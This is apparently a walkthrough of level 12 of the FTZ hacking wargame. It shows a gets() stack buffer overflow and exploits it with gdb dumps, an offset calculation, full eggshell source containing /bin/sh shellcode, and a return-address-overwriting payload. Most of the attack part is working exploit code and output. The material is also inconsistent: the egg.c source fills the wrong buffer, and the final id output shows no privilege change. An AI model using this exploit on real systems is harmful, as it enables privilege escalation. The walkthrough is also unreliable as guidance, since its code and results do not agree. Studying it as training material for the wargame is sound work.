# Level12

## This level's goal
- BOF(Buffer Overflow)
- Stack Buffer Overflow

***

```
[level12@ftz level12]$ cat hint

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main( void )
{
        char str[256];

        setreuid( 3093, 3093 );
        printf( "문장을 입력하세요.\n" );
        gets( str );
        printf( "%s\n", str );
}
```

```
[level12@ftz level12]$ cp attackme tmp/
[level12@ftz level12]$ gdb -q tmp/attackme
(gdb) disas main
0x08048473 <main+3>:    sub    $0x108,%esp
0x080484bf <main+79>:   call   0x804834c <printf>
(gdb) b *0x080484bf
(gdb) run
Starting program: /home/level12/tmp/attackme
문장을 입력하시오.
AAAAAAAA

Breakpoint 1, 0x080484bf in main ()
(gdb) x/72x $esp
0xbffff450:     0x0804854c      0xbffff460      0xbffff480      0x00000001
0xbffff460:     0x41414141      0x41414141      0x00000000      0x078e530f
0xbffff470:     0xbffff510      0x40015a38      0x0029656e      0x00000000
0xbffff480:     0x4200b894      0x400160b0      0x00000000      0x00000000
0xbffff490:     0x00000000      0x00000000      0x00000000      0x4000807f
0xbffff4a0:     0x4001582c      0x00001f1f      0xbffff4d0      0xbffff4fc
0xbffff4b0:     0x4000be03      0x4001624c      0x00000000      0x0177ff8e
0xbffff4c0:     0x4000807f      0x4001582c      0x00000059      0x40015a38
0xbffff4d0:     0xbffff520      0x4000be03      0x40015bd4      0x40016380
0xbffff4e0:     0x00000001      0x00000000      0x4200dba3      0x420069e4
0xbffff4f0:     0x42130a14      0xbffffc26      0xbffff5b4      0xbffff534
0xbffff500:     0x4000bcc0      0x08049648      0x00000001      0x08048249
0xbffff510:     0x4210fd3c      0x42130a14      0xbffff538      0x4210fdf6
0xbffff520:     0x08049560      0x08049664      0x00000000      0x00000000
0xbffff530:     0x4210fdc0      0x42130a14      0xbffff558      0x08048451
0xbffff540:     0x08049560      0x08049664      0x4001582c      0x0804839e
0xbffff550:     0x080482e4      0x42130a14      0xbffff568      0x080482fa
0xbffff560:     0x4200af84      0x42130a14      0xbffff588      0x42015574
(gdb) x/x 0xbffff588
0xbffff588:     0x00000000
(gdb) x/s 0x42015574
0x42015574 <__libc_start_main+228>:      "\211ÁëX1É\213\203\204#"

(gdb) run
Starting program: /home/level12/tmp/attackme
문장을 입력하시오.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Breakpoint 1, 0x080484bf in main ()
(gdb) x/72x $esp
0xbfffddd0:     0x0804854c      0xbfffdde0      0xbfffde00      0x00000001
0xbfffdde0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffddf0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffde00:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffde10:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffde20:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffde30:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffde40:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffde50:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffde60:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffde70:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffde80:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffde90:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffdea0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffdeb0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffdec0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffded0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffdee0:     0x4200af00      0x42130a14      0xbfffdf08      0x42015574
(gdb) x/x 0xbfffdf08
0xbfffdf08:     0x00000000
(gdb) x/x 0x42015574
0x42015574 <__libc_start_main+228>:     0x58ebc189
```

-----Memory Structure-----   
char str[256] : 256byte   
dummy : 8byte   
SFP : 4byte   
RET : 4byte

You can exploit in RET, so you need to input something dummy string (268byte)

```
[level12@ftz tmp]$ (perl -e 'print "\x41"x267') | /home/level12/attackme
문장을 입력하세요.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

[level12@ftz tmp]$ (perl -e 'print "\x41"x268') | /home/level12/attackme
문장을 입력하세요.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```


```
[level12@ftz tmp]$ cat egg.c

#include <stdio.h>
#include <stdlib.h>

#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 512
#define DEFAULT_EGG_SIZE 2048
#define NOP 0x90

char shellcode[] =
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_esp(void) {
                __asm__("movl %esp, %eax");
}

int main(int argc, char *argv[])
{

        char *buff, *ptr, *egg;
        long *addr_ptr, addr;
        int offset=DEFAULT_OFFSET;
        int bsize=DEFAULT_BUFFER_SIZE;

        int i, eggsize=DEFAULT_EGG_SIZE;

        if (argc > 1) bsize = atoi(argv[1]);
        if (argc > 2) offset = atoi(argv[2]);
        if (argc > 3) eggsize = atoi(argv[3]);

        if (!(buff = malloc(bsize)))
        {
                        printf("Can't allocate memory.\n");
                                exit(0);
        }
        if (!(egg = malloc(eggsize)))
        {
                        printf("Can't allocate memory.\n");
                                exit(0);
        }
        addr = get_esp() - offset;
        printf("Using address: 0x%x\n", addr);

        ptr = buff;
        addr_ptr = (long *)ptr;
        for(i=0; i<eggsize - strlen(shellcode) -1; i++)
                        *(ptr++) = NOP;
        for(i=0; i<strlen(shellcode); i++)
                        *(ptr++) = shellcode[i];

        buff[bsize - 1] = '\0';
        egg[eggsize -1] = '\0';
        memcpy(egg, "EGG=", 4);
        putenv(egg);
        putenv(buff);
        system("/bin/sh");
}

[level12@ftz tmp]$ gcc egg.c -o egg

[level12@ftz tmp]$ cat getegg.c
#include <stdlib.h>

main() {
        printf("EGG : %p", getenv("EGG"));
}

[level12@ftz tmp]$ gcc getegg.c -o getegg
```

```
[level12@ftz tmp]$ ./egg 459
Using address: 0xbfffe8b8

sh-2.05b$ ./getegg
EGG : 0xbffff69c

sh-2.05b$ (perl -e 'print "A"x268,"\x9c\xf6\xff\xbf"';cat) | /home/level12/attackme

id
uid=3092(level12) gid=3092(level12) groups=3092(level12)

my-pass
Level12 Password is "it is like this".

```

0xbffff69c   
bf ff f6 9c   
9c f6 ff bf   
\x9c\xf6\xff\xbf
